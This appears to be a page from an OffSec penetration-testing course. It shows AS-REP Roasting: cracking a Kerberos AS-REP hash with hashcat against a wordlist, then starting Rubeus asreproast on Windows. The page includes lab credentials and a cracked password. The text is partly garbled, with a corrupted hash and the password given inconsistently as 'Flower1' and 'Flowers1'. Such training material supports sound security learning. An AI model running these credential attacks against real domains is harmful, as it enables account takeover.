# OffSec

Penetration Testing with Kali Linux

We've collected everything we need to launch Hashcat and the AS-REP hash. Let's enter the mode 18200, the file containing the AS-REP hash, rocky.txt aslist, best64.rule we use file, and -force to force the cracking on our Kali VM.

```
kali@kali:~ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rocky.txt
-r /usr/share/hashcat/rules/best64.rule
```

```
$kr8srep23$aveCORP.com:b246a19cfa585dc1894fd692412b609s9b1e2632a946d147b5aa80b
7398775d233a458f07b3a779908f73a7988f73c7b11f2bc275a51a675f64b0d4a2926c103d3b2e3c750c
f3a2c3a2780ef2f7ab563f8bb32f1a88d36c9d824a3b6544d57b441f1125618f9242c4b17d1bf4655362
fc143b4539a6670927693b356417c111143808666444440055111f77200999999dd3255009995556666655\111188444426633311111116522552222221111111445555555557777773d35a7c280847f3c71c708d7affadf3
0992aa5566656d6e6f6bc3119f403c7869f1a6b8c3d3f150a402f144cd90773800452ce7e45757c
2:Flower1
```

List 807 - Cracking the AS-REP hash with Hashcat

Very nice! Hashcat successfully cracked the AS-REP hash. List 807 shows that the user dave has the password Flowers1.

> If you receive the Hashcat error "Not enough allocate device for this attack", shut down your Kali VM and add enough RAM to it. 4GB is enough for the examples and exercises of this Module.

As mentioned, we can also perform AS-REP Roasting on Windows. We'll use Rubeus¹⁰⁹ as a toolset for Kerberos interactions and abuses. To perform this attack, we will connect to CLIENT75 via RDP as user jeff with the password HenchmanPutridBonbon11. Next, we can start a PowerShell window and navigate to C:\Tools, where Rubeus can be found.

Since we're performing this attack as a non-privileged user, we don't have any other options besides Rubeus asreproast. Rubeus will automatically identify vulnerable users. We also add the flag /nowrap to prevent new lines adding to the resulting-AS hashes.

```
PS C:\Users\jeff> cd C:\Tools
PS C:\Tools> .Rubeus.exe asreproast /nowrap
```

```
(____)
(____)
|  |  |  |
|  |  |  |
|__|__|__||__|
|  |  |  |
|__|__|__||__|
|__|__|__||__|
(____)(____)(____)(____)
```

v2.1.2

¹⁰⁹ (Github, 2022), https://github.com/GhostPack/Rubeus

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

763